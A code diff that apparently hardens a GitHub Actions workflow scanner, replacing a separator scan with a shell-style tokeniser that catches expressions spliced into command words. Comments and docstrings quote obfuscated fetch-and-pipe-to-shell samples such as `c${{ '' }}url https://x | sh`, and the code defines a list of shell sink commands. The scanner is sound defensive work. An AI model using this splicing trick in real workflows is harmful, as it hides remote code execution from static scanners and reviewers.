@@ -149,11 +149,31 @@ SHELL_PLACEHOLDER_TOKEN_RE = re.compile(r"^[\"']?\{0\}[\"']?$")
 # Any other argument text is free to name a second interpreter.
 POWERSHELL_CALL_TOKEN_RE = re.compile(r"^[&.]\s*(?:'\{0\}'|\"\{0\}\"|\{0\})$")
 ACTIONS_EXPRESSION_RE = re.compile(r"\$\{\{.+?\}\}", re.DOTALL)
-# Text between the previous shell command separator and an expression. When that
-# text is a bare partial word, Actions splices the expanded value onto it and the
-# pair becomes one command word that no scanner saw. Refs #3673.
-SHELL_COMMAND_SEPARATOR_RE = re.compile(r"[\n;&|(]")
-PARTIAL_COMMAND_WORD_RE = re.compile(r"[\w./-]+")
+# One character standing in for an expression while the body is tokenised. NUL
+# cannot appear in a YAML scalar, so it can never collide with real content.
+EXPRESSION_SENTINEL = "\x00"
+# A word that assigns rather than names a command: `FOO=bar cmd` leaves `cmd` in
+# the command slot, so the assignment must not consume it.
+SHELL_ASSIGNMENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*(?:\[[^]]*\])?\+?=")
+# Reserved words that introduce a command rather than being one. Without these,
+# `if true; then c${{ '' }}url x | sh; fi` reads as though `then` were the
+# command and the spliced word merely its argument.
+SHELL_RESERVED_WORDS = frozenset(
+    {
+        "!", "(", ")", "{", "}", "&&", "||", "|", ";", "&",
+        "case", "do", "done", "elif", "else", "esac", "fi", "for", "if",
+        "in", "select", "then", "time", "until", "while",
+    },
+)
+# Commands that run their arguments, or text piped to them, as code. Reaching
+# one anywhere in the body means argument position no longer separates data
+# from code.
+SHELL_SINK_COMMANDS = frozenset(
+    {
+        "ash", "bash", "busybox", "command", "dash", "env", "eval", "exec",
+        "ksh", "nohup", "sh", "timeout", "xargs", "zsh",
+    },
+)
 # `bash -n` parses without executing. A body it accepts is valid shell, so a
 # Semgrep sub-parse failure on it is Semgrep's limitation rather than evidence
 # the step is unscannable. A body it rejects is genuinely malformed, and an
@@ -2560,25 +2580,205 @@ def _body_is_valid_shell_syntax(run: str) -> bool:
     return result.returncode == 0
 
 
+def _shell_redirect_target_end(text: str, index: int) -> int:
+    """Return the offset past a redirect operator and the word it targets."""
+    length = len(text)
+    cursor = index
+    while cursor < length and text[cursor] in "<>&-":
+        cursor += 1
+    while cursor < length and text[cursor] in " \t":
+        cursor += 1
+    while cursor < length and not text[cursor].isspace() and text[cursor] not in ";&|<>":
+        cursor += 1
+    return cursor
+
+
+def _shell_bracket_group_end(text: str, index: int) -> int:
+    """Return the offset past the bracket group opening at ``index``."""
+    opener = text[index]
+    closer = ")" if opener == "(" else "}"
+    depth = 0
+    cursor = index
+    length = len(text)
+    while cursor < length:
+        character = text[cursor]
+        if character == "\\":
+            cursor += 2
+            continue
+        if character == opener:
+            depth += 1
+        elif character == closer:
+            depth -= 1
+            if depth == 0:
+                return cursor + 1
+        cursor += 1
+    return length
+
+
+def _shell_quoted_span_end(text: str, index: int) -> int:
+    """Return the offset past the double-quoted span opening at ``index``."""
+    length = len(text)
+    cursor = index + 1
+    while cursor < length:
+        character = text[cursor]
+        if character == "\\" and cursor + 1 < length:
+            cursor += 2
+            continue
+        if character == '"':
+            return cursor + 1
+        cursor += 1
+    return length
+
+
+def _shell_words(text: str) -> list[tuple[str, bool, int]]:
+    """Split ``text`` into words, honouring quotes, escapes, and substitutions.
+
+    Each entry pairs the word with whether it occupied the command slot of a
+    simple command, plus the index of the pipeline it belongs to. Quoting,
+    backslash escapes, line continuations, command substitution, and bracket
+    groups all glue text into one word, which is what a plain separator scan
+    misses. A pipe keeps the pipeline index because data flows along it; every
+    other separator starts a new one.
+    """
+    words: list[tuple[str, bool, int]] = []
+    current: list[str] = []
+    index = 0
+    length = len(text)
+    expecting = True
+    word_expecting = True
+    pipeline = 0
+
+    def flush() -> None:
+        nonlocal current, expecting, word_expecting
+        if not current:
+            return
+        word = "".join(current)
+        current = []
+        if word_expecting and SHELL_ASSIGNMENT_RE.match(word):
+            # An assignment prefix does not consume the command slot.
+            words.append((word, False, pipeline))
+            expecting = True
+            return
+        words.append((word, word_expecting, pipeline))
+        if word_expecting:
+            expecting = word.strip("'\"") in SHELL_RESERVED_WORDS
+
+    def start_word() -> None:
+        nonlocal word_expecting
+        if not current:
+            word_expecting = expecting
+
+    while index < length:
+        character = text[index]
+        if character == "\\" and index + 1 < length:
+            start_word()
+            current.append(text[index : index + 2])
+            index += 2
+            continue
+        if character == "'":
+            start_word()
+            end = text.find("'", index + 1)
+            end = length if end == -1 else end + 1
+            current.append(text[index:end])
+            index = end
+            continue
+        if character == '"':
+            start_word()
+            end = _shell_quoted_span_end(text, index)
+            current.append(text[index:end])
+            index = end
+            continue
+        if character == "`":
+            start_word()
+            end = text.find("`", index + 1)
+            end = length if end == -1 else end + 1
+            current.append(text[index:end])
+            index = end
+            continue
+        if character == "$" and index + 1 < length and text[index + 1] in "({":
+            start_word()
+            end = _shell_bracket_group_end(text, index + 1)
+            current.append(text[index:end])
+            index = end
+            continue
+        if character in "<>":
+            if current and "".join(current).isdigit():
+                # A leading file descriptor belongs to the redirect, not a command.
+                current = []
+            flush()
+            index = _shell_redirect_target_end(text, index)
+            continue
+        if character == "|":
+            flush()
+            expecting = True
+            index += 1
+            continue
+        if character in ";&\n" or (character in "(){}" and not current):
+            flush()
+            expecting = True
+            pipeline += 1
+            index += 1
+            continue
+        if character.isspace():
+            flush()
+            index += 1
+            continue
+        start_word()
+        current.append(character)
+        index += 1
+    flush()
+    return words
+
+
+def _promote_shell_sink_arguments(
+    words: list[tuple[str, bool, int]],
+) -> list[tuple[str, bool, int]]:
+    """Treat every word in a pipeline that reaches a shell sink as a command word.
+
+    ``printf "c${{ '' }}url x | sh" | xargs -0 bash -c`` builds the command in an
+    argument and pipes it into a shell, so position alone stops separating data
+    from code. Scoping the promotion to the pipeline keeps an unrelated
+    ``curl ... | sh`` elsewhere in the body from promoting an expression that
+    only ever reaches an ``if`` condition.
+    """
+    sinks = {
+        pipeline
+        for word, is_command, pipeline in words
+        if is_command and word.strip("'\"") in SHELL_SINK_COMMANDS
+    }
+    return [
+        (word, is_command or pipeline in sinks, pipeline) for word, is_command, pipeline in words
+    ]
+
+
 def _splices_expression_into_command_word(run: str) -> bool:
-    """Report whether an Actions expression is glued onto a partial command word.
+    """Report whether an Actions expression can shape a command word.
 
     Actions substitutes ``${{ ... }}`` before Bash ever runs, so Semgrep and
     every other static scanner read the pre-substitution text. Writing
     ``c${{ '' }}url https://x | sh`` hides ``curl`` from the rules while Actions
-    reassembles the real command, and the resulting PowerShell parse error was
-    then excused as an expression false positive. Splitting a command word this
-    way has no legitimate use: all 17 expression-bearing Bash steps in this
-    repository place the expression in argument or string position instead.
-    Refs #3673.
+    reassembles the real command, and the resulting parse error was then
+    excused as an expression false positive.
+
+    An earlier form of this check scanned backwards for a separator character.
+    An adversarial review defeated it sixteen ways, because quoting, escapes,
+    line continuations, command substitution, redirects, brace groups, reserved
+    words such as ``then`` and ``do``, and ``eval`` or ``xargs`` all reach
+    command position without crossing one of those separators. Masking each
+    expression and tokenising the body the way a shell does covers all sixteen
+    while leaving every argument-position and string-position use alone.
+
+    A word that is nothing but the expression stays tolerated. That shape is
+    raw interpolation, which its own validation already covers, and it is not
+    the obfuscation this check exists to catch. Refs #3673.
     """
-    for match in ACTIONS_EXPRESSION_RE.finditer(run):
-        preceding = SHELL_COMMAND_SEPARATOR_RE.split(run[: match.start()])[-1].lstrip()
-        # An empty segment means the expression is the whole command word, which
-        # raw-interpolation validation already covers, not this obfuscation.
-        if preceding and PARTIAL_COMMAND_WORD_RE.fullmatch(preceding):
-            return True
-    return False
+    masked = ACTIONS_EXPRESSION_RE.sub(EXPRESSION_SENTINEL, run)
+    if EXPRESSION_SENTINEL not in masked:
+        return False
+    return any(
+        EXPRESSION_SENTINEL in word and is_command and word.strip("'\"") != EXPRESSION_SENTINEL
+        for word, is_command, _ in _promote_shell_sink_arguments(_shell_words(masked))
+    )
 
 
 def _step_defeats_bash_subparse(shell: str | None, run: str) -> bool:
